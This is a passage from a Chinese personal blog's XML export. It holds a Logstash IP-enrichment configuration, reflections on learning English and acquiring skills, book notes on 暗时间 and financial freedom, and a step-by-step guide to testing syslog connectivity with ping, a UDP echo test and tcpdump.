class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">    stdin &#123; &#125;</span><br><span class="line">    syslog &#123;</span><br><span class="line">      port =&gt; <span class="string">"514"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter &#123;</span><br><span class="line">    grok&#123;</span><br><span class="line">         <span class="comment">#匹配获取IP</span></span><br><span class="line">         match =&gt; &#123;<span class="string">"message"</span> =&gt; <span class="string">"%&#123;IPV4:ip&#125;"</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    http &#123;</span><br><span class="line">        <span class="comment">#调用外部接口获取IP的详细信息</span></span><br><span class="line">        url =&gt; <span class="string">"http://ip-api.com/json/%&#123;ip&#125;"</span></span><br><span class="line">        verb =&gt; <span class="string">"GET"</span></span><br><span class="line">        add_field =&gt; &#123;</span><br><span class="line">          <span class="string">"new_field"</span> =&gt; <span class="string">"new_static_value"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        replace =&gt; &#123;     </span><br><span class="line">            <span class="comment">#这里对原始日志数据进行补全，如加了新的字段及从接口中获取的信息</span></span><br><span class="line">            <span class="string">"message"</span> =&gt; <span class="string">"%&#123;message&#125;|%&#123;ip&#125;: My new message|%&#123;new_field&#125;|%&#123;[body][as]&#125;"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">    stdout &#123; &#125;</span><br><span class="line">    syslog &#123;</span><br><span class="line">        host =&gt; <span class="string">"192.168.2.173"</span></span><br><span class="line">        port =&gt; <span class="string">"7514"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过http接口调用API取得数据，然后通过mutate重新组合补全信息，这里通过调用获取IP地址信息的API获取IP的信息，然后补全到原始日志中。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200414/16.png" alt="在这里插入图片描述"></p><p>可以看出logstash是一个非常灵活好用的数据采集框架工具，可以通过简单的配置满足绝大多数数据采集场景的需求。</p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据 </tag>
            
            <tag> ELK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英语学渣的我是如何撸完一本英文原著的</title>
      <link href="/posts/1e6a75de/"/>
      <url>/posts/1e6a75de/</url>
      
        <content type="html"><![CDATA[<p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/20200407/blogimage/englishimage.png" alt="英语原著"><br>2020年初立的flag就有要看完十本英文原著。看英文原著对于英语学渣的我来说几乎是很难想像的事情。说英语烂那只有自己知道，读书的时候从来就没有学好过，工作这么多年更是忘得一干二净了。与英语相爱相杀若干年，经历了无数次从开始到放弃……</p><p>非常羡慕别人能够很顺畅的看懂英文原著，能够丢开字幕看懂英语大片，能够飚一口的英文。有人说学好了英文就给自己多开了一扇了解世界的窗户，比别人多一半的人生经历。英语对于生活在全球化信息时代的我们来说有多么的重要，不用多说，道理啥的咱都知道，可是经历了这么多年还是学不会啊。买了N多的英语学习资料，下了N多的视频教程，查找了各种学习英语的方法。单词书永远都是翻了前面几页，英语学习资料屯了一堆从来没有开封过，市面上吹捧的各种英语学习方法感觉都很不错，尝试了很多种还是在尝试……</p><p>虽然有过无数次失败的经历，但也越来越认识到英语的重要性，也看到越来越多的人将英语学得很溜，让我清醒的认识到英语很重要，英语很难学，英语是一定是可以学好的，但是妄想速成是不可能的。如何才能最终习得英语的技能呢？</p><p>前新东方英语老师李笑来在他的《财富自由之路》中指出在智力上、知识上、经验上，复利效应对每个人来说都是存在的。知识和能力的习得与积累是有复利效应的。所以，大多数的人应该要相信自己能够通过知识和能力的积累和复利获得成功和成长。经过多年教训，所有什么打着21天搞定单词，一个月看懂原著啥的口号都是骗人的。在英语技能的习得上，我笃信只有坚持积累和复利才能最终成功。我坚信经过自己的努力和坚持，我在英语习得上投入的精力和时间超过成本线以后，我的英语水平将会有突破性的提高。</p><p>在英语学习的过程中有过<a href="https://xiejava.gitee.io/posts/48451ead/">《坚持了330天，我终于放弃了背单词》</a>的经历，让我认识到只有“用”英语，才能够真正的掌握英语。目前我最朴素的需求就是想能够看懂英文文档，能够流畅的阅读英文书籍。而目前所处的语言环境”说”英语的需求不是很迫切。对于我来说能够流利阅读英语已经足够了。既然开始“用”英语，那就从大量开始阅读英语原版书开始吧！英语这么菜，我为什么敢挑战英文原版书呢？因为我看到了李笑来老师提到掌握一门外语的最少必要知识。<br>1、认识字母<br>2、认识音标<br>3、会查字典<br>4、懂点基本语法<br>5、会用百度或google等搜索引擎。<br>如果掌握了这些最小必要的知识，你就已经“入门”了，接下了就只剩下所谓“执行”了，也就是要用起来。<br>我想，这些最小必要的知识我基本都已经具备了。在正式准备看英语原著之前，我看完了全套149本《书虫》（见<a href="https://xiejava.gitee.io/posts/40bbedc5/">《看完全套149本《书虫》是种什么样的体验》</a>）。对于英语的阅读相对来说没有那么怵了。<br>虽然我看完了全套149本《书虫》，但是《书虫》毕竟只是入门级的英语简写读物，与英语原版的原著还是有很大的距离的。</p><p>作为英语原著初读者来说，真正看完一本书，完成从0到1的过程，比深刻理解一本书更重要。而对于初读者来说如何撸完一本英文原著还是比较有挑战的。</p><p><strong>首先要找到一本自己非常感兴趣并且适合自己难度的书籍。自己不感兴趣或者难度太难了，就会容易放弃。</strong><br>对于挑选原版书的阅读材料来说，我也是花的一些功夫。网上有人建议刚开始接触英语原著建议是比较浅的原著如儿童读物《夏洛的网》、《格林童话》、《小王子》之类的。对于我这种成年人来说这类读物实在是提不起我的兴趣。还有人推荐《哈利波特》系列，我不是哈迷所以也没有选择《哈利波特》系列。我选择的是《奇迹男孩》。《奇迹男孩》的电影在2018年上映的时候我就想看，但是一直没有时间去看。正好买了这本英文原著来看看。《奇迹男孩》英文原著豆瓣评分9.1分，属于儿童成长类的书籍，老少皆宜，300来页长短适中不是那种大部头。因为是面向青少年的书籍所以单词不难，而且是近几年出的新书畅销书，比较口语化没有太多的长句子，非常通俗。事实证明《奇迹男孩》非常适合像我这样的英语原著初读者。<br><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/20200407/blogimage/wonder.png" alt="奇迹男孩"></p><p><strong>选择了阅读目标的原版书籍后，就要开始读并坚持下来</strong><br>作为英语原著初读者，即使是最通俗的原版书，单词也会是一个拦路虎。单词没有办法，那就是勤查字典。《奇迹男孩》是面向青少年的书籍，单词不难，但对我来说也是充斥着各种生词。不过还好每页大概是在6、7个左右。如果按照伍君仪的《把你的词汇用起来》中的透析法，隔一个生词查一个，只查一半的生词，剩下的靠猜，那每页只要查2-3个单词左右，这个查词量已经很小了。因为这本书对我来说生词量6、7个不算多，而且作为原著初读者，猜单词的意思往往猜不准，所以我就索性看到不懂的单词每个都会查字典。为了尽快的撸完这本书，我也是给自己定了个目标，每天看30页。看少了不记得前后的情节，看多了怕自己看不下去。别看只有区区的30页，看中文也就半个小时的事情，但是看英文又要查字典，平均要花掉2-3个小时才能看完。所以对于英语原著初读者来说30页是个比较适中的量，后续如果熟练的可以慢慢的增加。这本《奇迹男孩》300多页，大概花了我一周半的时间。</p><p><strong>对于英语原版书是看电子版的还是纸质版的，建议还是先看纸质版的</strong><br>作为英语原著初读者，我自己认为还是先看纸质版。看电子版的有个好处就是可以随时查字典，尤其是用kindle看，开启生词提示，并且长按生词就会调出字典查词，非常方便。正是因为太方便了，会让我们产生依赖，有时很容易的单词还会忍不住去查一下字典。而且有时候要往回看情节翻起来也不太方便。虽然有进度显示但是没有纸质书那么直观。纸质书看起来更加有感觉，可以前后翻，有时不记得前面的情节了可以方便的随时翻看，每天看了多少页插个书签就是。看着书签慢慢的插到了最后心里还是满满的成就感。</p><p>对于英语原著初读者来说，撸完一本英文原著，完成从0到1的过程。这种小小的成就感，更加坚定了学习英语的信心。相信经过自己的努力和坚持，看完数十本英文原著以后，英语水平将会有突破性的提高。</p><p>学习外语没有其他任何捷径，唯有“结硬寨,打呆仗;日拱一卒,功不唐捐!”</p><p>我读过的英文读本豆列： <a href="https://www.douban.com/doulist/118432400/" target="_blank" rel="noopener">https://www.douban.com/doulist/118432400/</a></p><p>爱分享读书豆瓣小组： <a href="https://www.douban.com/group/655112/" target="_blank" rel="noopener">https://www.douban.com/group/655112/</a></p><hr><center>关注：“爱分享读书”微信公众号 <p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/%E7%88%B1%E5%88%86%E4%BA%AB%E8%AF%BB%E4%B9%A6%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><p>读书我们是认真的</p></center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>忘掉10000小时，如何快速获得某项技能</title>
      <link href="/posts/10547b72/"/>
      <url>/posts/10547b72/</url>
      
        <content type="html"><![CDATA[<p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/20200328/blogimage/%E4%B8%80%E4%B8%87%E5%B0%8F%E6%97%B6%E5%AE%9A%E5%BE%8B.png" alt="一万小时定律"></p><p>几乎每个人都知道1万小时定律，这个定律被人奉为圭臬。给每个渴望成功的同学们指明了方向，只要在某个领域付出不断的努力，达到10000个小时，就可以成为这方面的专家领袖。</p><p>所谓“一万小时定律”，最早出现于作家格拉德威尔《异类》一书。在书中，格拉德威尔举出了例如比尔盖茨这样的例子，言之凿凿的声称：那些天才和专家之所以卓越非凡，并非他们的天赋超人一等，而是他们付出了持续不断的努力。而任何普通人都可以达到这样的目标，只需要付出10000小时的训练即可。</p><p>这个定律非常符合大家的胃口，也有一定的道理，不怀疑在一个方向上持续不断的努力肯定会有所成功。在智力上、知识上、经验上，复利效应对每个人来说都是存在的。知识和能力的习得与积累是有复利效应的。所以，大多数的人应该要相信自己能够通过知识和能力的积累和复利获得成功和成长。</p><p>但是10000小时不是个很短的时间，如果每天投入2个半小时，那要10年才能成为专家。大多数人不用说坚持10000个小时，坚持100个小时还没有入门，就已经倒下放弃了。而对正常人现实需求来说，一万小时是成为顶尖高手的门槛，可遇而不可求。想要获得比较好的收入，能够做出较好的事情，基本上只需要超过平均水平即可。不必凡事都跟行业内最顶尖的几个人相比，但是能够超过一个行业的平均水平，也足够获取比较好的利润、回报和成绩。</p><p>对于任何一件事情、一个行业领域或者是一个学习任务而言也只有先入门了，取得了比较好的利润、回报和成绩，才会有兴趣持续的做下去，才可能有10000小时精进的努力。所以<strong>忘掉10000小时，先快速的入门达到超过行业平均水准，才能继续后面的牛逼</strong>。</p><p>那么问题来了，如何才能快速的入门呢？<br>李笑来的《财富自由之路》里，指出了两个关键字“<strong>最少必要知识</strong>”、”<strong>用</strong>“<br>当需要进入某个行业、获得某项技能的时候，一定要想办法在最短的时间里弄清楚都有哪些最小必要知识，然后迅速的掌握它们。任何人都可以完成快速入门。例如掌握一门外语的最少必要知识有哪些呢？<br>1、认识字母<br>2、认识音标<br>3、会查字典<br>4、懂点基本语法<br>5、会用百度或google等搜索引擎。<br>如果掌握了这些最小必要的知识，你就已经“入门”了，接下了就只剩下所谓“执行”了，也就是要用起来。通过用起来才能从入门到熟练。然后就要专注于改进了。<br>所以快速学习或快速掌握一门技能进入某个行业。无外乎就是快速的掌握最小必要的知识迅速入门，然后通过不断的用起来，在用的过程中不断的实践。逐步从入门到熟练，熟练后就可以专注创新改进而达到精进。</p><p>道理就是这么个道理，但是为什么有些人学什么东西入门就是比你快呢？<br>就是他已有的<strong>背景知识</strong>掌握得比你广、比你好，比如同样是学机器学习，数学系的大概率的要比计算机系的要入门快，计算机系的大概率的要比文科类专业的入门要快。因为学机器学习需要比较强的数学知识背景，虽然入门同样是要掌握那几种常用的算法，数学系的理解起来要比非数学系统理解起来要快得多。</p><p>所以要想快速进入某个行业、获得某项技能，先弄清楚这个行业都需要哪些最小必要知识，评估一下自己的背景知识的匹配度，迅速补齐掌握最小的必要知识，持续的用，不断的改进。实际上当你进入到某个行业实际上就已经补齐完善了你的背景知识。通过不断的学习，背景知识框架体系会越来越广，那你学东西会越来越快。形成一个正向循环。让你越来越牛逼！</p><hr><center>关注：“爱分享读书”微信公众号 <p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/%E7%88%B1%E5%88%86%E4%BA%AB%E8%AF%BB%E4%B9%A6%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><p>读书我们是认真的</p></center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《暗时间》读书笔记</title>
      <link href="/posts/431cf122/"/>
      <url>/posts/431cf122/</url>
      
        <content type="html"><![CDATA[<p>刘未鹏说——</p><p><strong>写博客这件事情给我最大的体会就是，一件事情如果你能够坚持做8年，那么不管效率和频率多低，最终总能取得一些很可观的收益。而另一个体会就是，一件事情只要你坚持得足够久，“坚持”就会慢慢变成“习惯”。原本需要费力去驱动的事情便成了家常便饭，云淡风轻。</strong></p><p>这本书便是从刘未鹏8年的博客文章中精选出来的，主要关于心智模式、学习方法和时间利用，《暗时间》的书名便来自于此。</p><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/20200328/blogimage/%E3%80%8A%E6%9A%97%E6%97%B6%E9%97%B4%E3%80%8B.png" alt="《暗时间》"></p><h1 id="第一章-暗时间"><a href="#第一章-暗时间" class="headerlink" title="第一章 暗时间"></a>第一章 暗时间</h1><p>善于利用思维时间的人，可以无形中比别人多出很多时间，从而实际意义上能比别人多活很多年。<br>学习一门专业应该是投入之间和效率的乘积。<br>你可以“投入”很多时间在一件事情上面，却发现毫无进展，因为你没有整天把你要做的事情，要学习的东西常驻在你的大脑中，时刻给予它最高的优先级。<br>如果你有做总结的习惯，你在度过一段时间之后总结自己在某某领域投入了多少时间，建议千万不要粗略地去计算有多少天下班后拿起书来翻看过，因为这样你也许会发现书倒是常翻，但领悟却不见得多深，表面上花的时间不少，收益却不见得那么大。因为<strong>看书并记住书中的东西只是记忆，并没有涉及推理，只有靠推理才能深入理解一个事物，看到别人看都不到的地方，这部分推理的过程就是你的思维时间，也是人一生中占据一个显著比例的“暗时间”</strong>，你走路、买菜、洗脸洗手、坐公车、逛街、出游、吃饭、睡觉，所有这些时间都可以成为“暗时间”，你可以充分利用这些时间进行思考，反刍和消化平时看和读的东西，让你的认识能够脱离照本宣科的层面。</p><h1 id="第二章-设计你自己的进度条"><a href="#第二章-设计你自己的进度条" class="headerlink" title="第二章 设计你自己的进度条"></a>第二章 设计你自己的进度条</h1><p>如果没有进度提示，我们无法判断这个等待什么时候才是个尽头。如果有不断增长的进度条，那么我们对于什么时候会达到100%就会有一个粗略的估计。做事情也是同样的道理，善于规划的人，会将目标分割成一个个的里程碑，再将里程碑分割成TODO列表。<br>过早退出是一切失败的根源。<br>兴趣遍地都是，专注和持之以恒才是真正稀缺的。<br>靠专业技能的成功是最具可复制性的。它需要的只是你在一个领域坚持不懈地专注下午，只需要选择一个不算太靠谱的方向，然后专心致志的专下去，最后必然能成为高手或绝顶高手。<br>反思是让人得以改进自己的最重要的思维品质。<br>一生的知识积累，自学的起码占90%</p><h1 id="第三章-如何有效地记忆与学习"><a href="#第三章-如何有效地记忆与学习" class="headerlink" title="第三章 如何有效地记忆与学习"></a>第三章 如何有效地记忆与学习</h1><p>你所拥有的知识并不取决于你记得多少，而在于它们能否在恰当的时候被回忆起来。<br> 如何有效的总结知识，学以致用<br>1）养成习惯，经常主动回顾一段时间学到的东西。<br>2）创造回忆的机会<br>  2.1）经常与别人讨论，或者讲给别人听。“教是最好的学”<br>  2.2）整理笔记。<br>  2.3）书写。“书写是更好的思考”<br>3）设身处地的“虚拟经历”别人经历过的事情。<br>4）抽象和推广<br>5）联系/比较自身的经历</p><h1 id="第五章-学习习惯"><a href="#第五章-学习习惯" class="headerlink" title="第五章 学习习惯"></a>第五章 学习习惯</h1><h2 id="一、学习与思考"><a href="#一、学习与思考" class="headerlink" title="一、学习与思考"></a>一、学习与思考</h2><p>1、Google&amp;Wiki 遇到问题先上网搜索，自己找答案。<br>2、看书只看经典。<br>3、做读书笔记。便于回顾、加深理解<br>     a.将自己阅读时候的思考总结下来。<br>     b.将书中的好例子摘抄下来。<br>4、无时不可不思考。思考可以避免焦虑。<br>5、要事优先<br>6、重要的事情营造比较大的时间块来完成。<br>7、多看心理学与思维的书。<br>8、学习一项知识三问（a.它的本质是什么。b.它的第一原则是什么。c.它的知识结构是怎样的）<br>9、获得的多少并不取决于读了多少，而取决于思考了多少，多深。<br>10、善于利用小块时间。<br>11、养成好习惯。</p><h2 id="二、时间管理"><a href="#二、时间管理" class="headerlink" title="二、时间管理"></a>二、时间管理</h2><p>1、学习和思考过程中常问自己几个问题<br>    a.你的问题到底是什么？（提醒自己思考不要偏离问题）<br>    b.到现在为止，我到底有了什么收获呢？（提醒自己时不时去总结，整理学习的东西）<br>    c.设想自己正在将东西讲给别人听。<br>    d.时常反省和注意自己的思维过程。（将思维的大致脉络写下来是个很好的习惯）<br>    e.养成反驳自己的想法的习惯。<br>    f.人的思维天生就是极易流于表面来理解事物的。觉得自己理解了一个问题了吗？条件反射的问自己：你真的理解了吗？你真的理解了问题的本质吗？问题的本质到底是什么？目前我的理解是什么？我对这个理解感到满意吗？这样的理解到底有什么建设性呢？等等。<br>2、重视知识的本质<br>3、重视积累的强大力量，万事提前准备。<br>4、抬起头来：时不时抬起头来审视一下自己正在做的事情，自问一下有什么价值，是不是你真正希望做的。它们重要吗？你需要在这个时候学这些吗？你的时间就是你的资源，你投入这些资源来掌握知识，所以到底用来掌握哪些知识是一个很重要的问题。</p><h2 id="三-知识结构"><a href="#三-知识结构" class="headerlink" title="三 知识结构"></a>三 知识结构</h2><p>抓住不变量<br>知识分为essential(必要)和non-essential（非必要）的。对于前者提前深入掌握牢靠，对于后者采取待用到的时刻RTM(Read the manual)方法。</p><h1 id="第八章-书写是为了更好的思考"><a href="#第八章-书写是为了更好的思考" class="headerlink" title="第八章 书写是为了更好的思考"></a>第八章 书写是为了更好的思考</h1><p>1、书写是对思维的备忘<br>2、书写是对思维的缓存<br>3、书写是与自己的对话<br>4、书写是与别人的交流<br>如果你着自己将一些不成熟的想法写下来，看着自己写的内容，试着进一步拓展它们，就有可能在理性的道路上走得很远，很远。</p><h1 id="第九章-为什么你从现在开始就应该写博客"><a href="#第九章-为什么你从现在开始就应该写博客" class="headerlink" title="第九章 为什么你从现在开始就应该写博客"></a>第九章 为什么你从现在开始就应该写博客</h1><p>用博客的形式来记录下你有价值的思考，会带来很多好处，却没有任何明显的坏处。<br>价值博客的几点好处<br>1、能交到很多志同道合的朋友。<br>2、书写是为了更好的思考<br>3、教是最好的学<br>4、讨论是绝佳的反思<br>5、激励你去持续学习和思考<br>6、学会持之以恒地做一件事情。<br>7、一个长期的价值博客是一份很好的简历。</p><h1 id="第十二章-什么才是你的不可替代性-amp-核心竞争力"><a href="#第十二章-什么才是你的不可替代性-amp-核心竞争力" class="headerlink" title="第十二章 什么才是你的不可替代性&amp;核心竞争力"></a>第十二章 什么才是你的不可替代性&amp;核心竞争力</h1><p>1、专业领域技能：成为一个专业领域的专家，你的专业技能越强，在这个领域的不可替代性就越高。<br>2、跨领域的技能：解决问题的能力，创新思维，判断与决策能力，批判性思维能力，表达沟通能力等等。<br>3、学习能力：持续学习和思考<br>4、性格要素：专注、持之以恒、自信、自省、好奇心。等等。</p><hr><center>关注：“爱分享读书”微信公众号 <p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/%E7%88%B1%E5%88%86%E4%BA%AB%E8%AF%BB%E4%B9%A6%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“爱分享读书”微信公众号" title="“爱分享读书”微信公众号"></p><p>读书我们是认真的</p></center>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你所谓的财富自由是什么？</title>
      <link href="/posts/e3431c21/"/>
      <url>/posts/e3431c21/</url>
      
        <content type="html"><![CDATA[<p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/20200327/blogimage/%E8%B4%A2%E5%AF%8C%E8%87%AA%E7%94%B1.jpg" alt="财富自由"></p><p>实现财富自由是现如今大部分人的理想。不管是加班工作赚钱也好，搞刚需副业也好，还是创业做投资也好都是为了一个目的实现财富自由。有些人早早的就已经实现了财富自由，有些人一辈子也没有实现财富自由，更多的人则是在追求财富自由的路上。</p><p>看过《穷爸爸富爸爸》的人都知道财富自由是指你无须为生活开销而努力为钱工作的状态。简单地说，你的资产生的被动收入必须至少等于或超过你的日常开资–这是我们大多数人向往的状态。这个定义非常清晰，大多数的人都认同这种说法。但是对我来说感触最深的还是李笑来老师在他的《财富自由之路》里面的定义：<strong>“个人财富自由，是指某个人再也不用为了满足生活必须而出售自己的时间了”</strong>。这是多么深刻的认识啊，你加班工作也好，副业也好不都是在出售自己的时间获得财富吗？即使是创业做投资本质上也是在出售自己的时间，是在购买别人的时间再出售出去，只是有可能这样出售自己时间的效率更高而已。</p><p>李笑来老师在对时间的理解、对心智的认识，对学习的认识、对成长的认识，我觉得都非常的深刻。有人说他的书是鸡汤，但是他总是可以用非常浅显深刻的道理让你心甘情愿的干了这碗鸡汤还回味无穷。他的《财富自由之路》就是这么一本书。</p><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/20200327/blogimage/%E8%B4%A2%E5%AF%8C%E8%87%AA%E7%94%B1%E4%B9%8B%E8%B7%AF.png" alt="《财富自由之路》"></p><p>我们要的自由，其本质不是财富，财富只是工具：我们要的自由，本质上是时间的自主权。所以个人财富自由，是指某个人再也不用为了满足生活必须而出售自己的时间了。</p><p>如何才能让自己财富自由呢？一个世人皆知的道理就是积累和复利。</p><p>爱因斯坦曾经说过：复利是“世界第八大奇迹”。知之者赚，不知之者被赚。但是复利并不是凭空来的，你得现有成本的积累，积累越大复利的效果随着时间的推移效果会越来越显著。</p><p>对于资产投资者来说，如果你的投资收益如果是正的话，你不断的积累复投，若干年后你的财富增长将相当的可观。如果天生有个好爹可以继承财富，那么你起点就比别人高，可以通过财富的复利实现自由。但是大多数人没有爹可以拼，没有大笔财富可以继承。不过万幸并且公平的是，在智力上、知识上、经验上，复利效应对每个人来说都是存在的。知识和能力的习得与积累是有复利效应的。所以，大多数的人应该要相信自己能够通过知识和能力的积累和复利获得成功和成长。</p><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/20200327/blogimage/%E5%A4%8D%E5%88%A9%E6%9B%B2%E7%BA%BF.png" alt="复利曲线"> </p><p>一切有意义的成长过程都符合那个“复利曲线”。起初看来斜率突然发生变化的“点”，叫做“拐点”。如果作为一个投资者，你的投资是正利率，那么你的资产变化情况也符合这个有拐点、突破了成本线的、后端急速上扬的“复利曲线”。</p><p>如果没有资产可以继承，那就持续积累知识和能力吧。这是大多数人可以成功实现财富自由并且一定能成功的可靠路径。关注成长，而不是成功，因为当你的成长线终于穿越成本线时，你事实上已经成功了，可那肯定不是终点。因为如果你不成长了，有可能这个成长线还会往下掉，将你的成功的成果吞噬。</p><p>既然”复利曲线”那么有效，那为什么还有那么多人在成本线下苦苦挣扎，没有碰到所谓的拐点，更不用说什么财富自由了。这里要注意几个被容易忽视的东西，那就是“<strong>投入方向</strong>”、“<strong>沉没成本</strong>”、“<strong>利润</strong>”，“<strong>贬值</strong>”。</p><ul><li>投入方向</li></ul><p>如果方向有问题，那么你的努力就是南辕北辙，越努力离成功距离越远，那就谈不上什么积累和复利了。比如现在一个行业已经日落西山了要消亡，你还在这个行业傻傻的坚持努力。基本上是不可能成功的。</p><ul><li>沉没成本</li></ul><p>当你选择了一个正确的方向，经过了一段时间的努力，取得了一点小小的成绩，但是你停止了放弃了。在积累和复利之前就投降放弃了，以前的努力付出就成了沉没成本。</p><p>一个切身体会的例子，就是学英语。比如我通过一段时间的努力，看完了149本书虫，但是最近我放松了自己没有看英语了。如果还经过一段时间不坚持不努力，那我以前积累的这些单词什么的又会忘了。以前的努力将会白费了变成了“沉没成本”。</p><p>今天搞搞这个、明天搞搞那个，很多的努力就变成了沉没成本。回头一看，啥都没有积累更谈不上有复利了。所以如果要实现“复利曲线”。坚持和积累非常重要。</p><ul><li>利润</li></ul><p>复利复利，没有利润怎么能复利呢。利润高的复利效果更加明显，这个道理傻瓜都知道。所以说坚持做一件事情要考虑利润，也就是投入产出比。</p><p>比如花大量的时间放在看肥皂剧、刷社交软件上，这些事情不能让你成长或让你的能力提升有限，那对你能力成长产生复利的效果当然有限啊。</p><ul><li>贬值</li></ul><p>作为资本投资来说要考虑货币贬值，作为知识和能力的习得者来说要考虑知识的贬值。大家都知道计算机技术发展速度迅速，很多技术很快随着科技发展迅速的淘汰贬值。比如以前的CGI 、ASP、VB 等开发语言和技术现在都很少用了。那以前花精力学的这些知识都大幅度贬值了。当然有些知识和技能的贬值速度慢一些，比如通识知识、英语、驾驶、写作等。你赚钱的速度要大于你花钱的速度，你的资本才会有所以积累，有积累才有复利的可能。所以你的学习新知识的速度应该要大于知识贬值速度，你的知识和能力才会有积累和复利的可能。</p><p>用正确的方式做正确的事情，你一定会变得更好！</p><p>若长期持续用正确的方法做正确的事情，你的未来一定会很伟大！</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 读书 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>syslog日志接口调试方法</title>
      <link href="/posts/7bbe2925/"/>
      <url>/posts/7bbe2925/</url>
      
        <content type="html"><![CDATA[<p>日志数据采集，比较方便常用的就是通过syslog来进行数据采集，syslog可以通过udp协议来进行高效的数据传输。一般来说在工程实施的过程中需要对接对端系统的数据采集源可以通过以下步骤来进行syslog日志接口的调试。主要是验证syslog日志是否能正常送到指定的日志服务器的指定端口，日志服务器的指定端口是否能正常收到对端发过来的日志。</p><h1 id="1、检查双方网络是否通畅"><a href="#1、检查双方网络是否通畅" class="headerlink" title="1、检查双方网络是否通畅"></a>1、检查双方网络是否通畅</h1><p>网络通畅是所有网络连接的前提条件，可以先通过ping的方式，先确认一下对端数据源是不是可以ping通这边的日志接收服务器地址，看网络是否是通的。<br>一般来说只到对端能够ping通日志服务器地址就可以了，单向ping通就OK。<br>如果ping不通，那就要检查日志服务器的网络设置，如是否开启了防火墙，禁ping了。根据网络实际情况调整网络策略，确保网络是通的。</p><h1 id="2、检查端口是否通畅"><a href="#2、检查端口是否通畅" class="headerlink" title="2、检查端口是否通畅"></a>2、检查端口是否通畅</h1><p>通过数据源服务器telnet一下日志服务器地址和端口，看端口是不是通的。<br>有很多服务器上可能没有装telnet，也可以用ssh ip 端口  来验证一下。</p><h1 id="3、发送简单的报文测试"><a href="#3、发送简单的报文测试" class="headerlink" title="3、发送简单的报文测试"></a>3、发送简单的报文测试</h1><p>在对端通过发送udp报文来进行简单的测试<br>如日志接收服务器地址是172.28.65.32，端口514 则可以通过<code>echo “hello” &gt; /dev/udp/172.28.65.32/514</code> 来发送测试报文<br>在日志接收服务器用tcpdump收下有没有监听到报文过来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump udp port 514 -A -i any</span><br></pre></td></tr></table></figure><p>如果有就会有相应的显示<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/20200318/blogimage/1.png" alt="tcpdump"></p><h1 id="4、进行正式接口对接"><a href="#4、进行正式接口对接" class="headerlink" title="4、进行正式接口对接"></a>4、进行正式接口对接</h1><p>如果tcpdump可以收到日志，那就说明syslog的通信是没有问题的，接下来就可以进行具体的syslog的配置的调测了。</p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
